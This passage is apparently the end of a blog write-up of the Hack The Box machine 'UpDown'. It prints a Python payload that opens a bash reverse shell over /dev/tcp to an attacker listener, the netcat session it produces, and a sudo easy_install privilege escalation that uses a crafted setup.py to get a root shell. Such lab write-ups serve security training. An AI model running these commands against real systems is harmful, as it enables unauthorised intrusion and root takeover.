+</span></span><span style=display:flex><span>./siteisup
+</span></span><span style=display:flex><span>__import__<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)</span>.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.12/4242 0&gt;&amp;1&#34;&#39;</span><span style=color:#f92672>)</span>
+</span></span></code></pre></div><ul><li>Received connection as developer:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Local Listner</span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>goku㉿exploitation<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ nc -lvp <span style=color:#ae81ff>4242</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4242</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.12<span style=color:#f92672>]</span> from siteisup.htb <span style=color:#f92672>[</span>10.10.11.177<span style=color:#f92672>]</span> <span style=color:#ae81ff>58190</span>
+</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>911<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>developer@updown:/home/developer/dev$ id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>developer<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>developer@updown:/home/developer/dev$
+</span></span></code></pre></div><h1 id=privilige-escalation-road-to-root>Privilige Escalation: Road to Root!</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>developer@updown:~$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> developer on localhost:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User developer may run the following commands on localhost:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/local/bin/easy_install
+</span></span><span style=display:flex><span>developer@updown:~$ ls -alh /usr/local/bin/easy_install
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>229</span> Aug  <span style=color:#ae81ff>1</span> 18:07 /usr/local/bin/easy_install
+</span></span><span style=display:flex><span>developer@updown:~$ cat /usr/local/bin/easy_install
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
+</span></span><span style=display:flex><span>import re
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>from setuptools.command.easy_install import main
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    sys.argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> re.sub<span style=color:#f92672>(</span>r<span style=color:#e6db74>&#39;(-script\.pyw|\.exe)?$&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, sys.argv<span style=color:#f92672>[</span>0<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    sys.exit<span style=color:#f92672>(</span>main<span style=color:#f92672>())</span>
+</span></span></code></pre></div><ul><li>Using <a href=https://gtfobins.github.io/gtfobins/easy_install/>GTFOBINS</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>developer@updown:~$ TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>developer@updown:~$ echo <span style=color:#e6db74>&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span style=color:#66d9ef>$(</span>tty<span style=color:#66d9ef>)</span><span style=color:#e6db74> &gt;</span><span style=color:#66d9ef>$(</span>tty<span style=color:#66d9ef>)</span><span style=color:#e6db74> 2&gt;</span><span style=color:#66d9ef>$(</span>tty<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#39;)&#34;</span> &gt; $TF/setup.py
+</span></span><span style=display:flex><span>developer@updown:~$ sudo easy_install $TF
+</span></span><span style=display:flex><span>WARNING: The easy_install command is deprecated and will be removed in a future version.
+</span></span><span style=display:flex><span>Processing tmp.9evK3Sdvf8
+</span></span><span style=display:flex><span>Writing /tmp/tmp.9evK3Sdvf8/setup.cfg
+</span></span><span style=display:flex><span>Running setup.py -q bdist_egg --dist-dir /tmp/tmp.9evK3Sdvf8/egg-dist-tmp-bxQAxd
+</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>egg-dist-tmp-bxQAxd  setup.cfg	setup.py  temp
+</span></span><span style=display:flex><span><span style=color:#75715e># cd /root</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>root.txt  snap
+</span></span><span style=display:flex><span><span style=color:#75715e># cat root.txt</span>
+</span></span></code></pre></div><h1 id=thanks-for-reading>Thanks For Reading!</h1></article><section id=articleNext class="section nartrow"><h3 class=footer-next-heading>More articles from My Blog</h3><div class=footer-spacer></div><div class=next-articles-grid numberofarticles={numberOfArticles}><div class=post-row><a href=/posts/shoppy-htb-machine/ class=article-link id=article-link-bigger><div><div class=image-container><img src=/images/shoppy.jpg class=article-image></div><div><h2 class=article-title>Shoppy From Hack The Box - Easy Linux Machine</h2><p class=article-excerpt>Exploiting NoSQL injection to bypass the login page and gain access to Josh's credentials. Using Josh's credentials, we were able to access the internal chat web app, where we were able to obtain Jeager's leaked credentials and gain access to the machine. A weak password manager C++ application was used to gain access to a Docker container with the user deploy. Once we were inside the Docker container, we were able to escape from it to gain access as the root user.</p><div class=article-metadata>December 17, 2022 · 10 min read</div></div></div></a><a href=/posts/photobomb-htb-machine/ class=article-link><div><div class=image-container><img src=/images/photobomb.jpg class=article-image></div><div><h2 class=article-title>PhotBomb From Hack The Box - Easy Linux Machine</h2><p class=article-excerpt>Exploiting Command injection vuln to gain access to the machine then exploiting a script that we can run as root without password to gain root access.</p><div class=article-metadata>December 15, 2022 · 10 min read</div></div></div></a></div></div></section></section><script src=/js/progressBar.js></script><div class=footer-gradient></div><div class="section narrow"><div class=footer-hr></div><div class=footer-container><div class=footer-text>© 2024 My Blog</div><div class=social-icon-outer><div class=social-icon-container></div></div></div></div></div><script src=/js/prism.js></script></body></html>
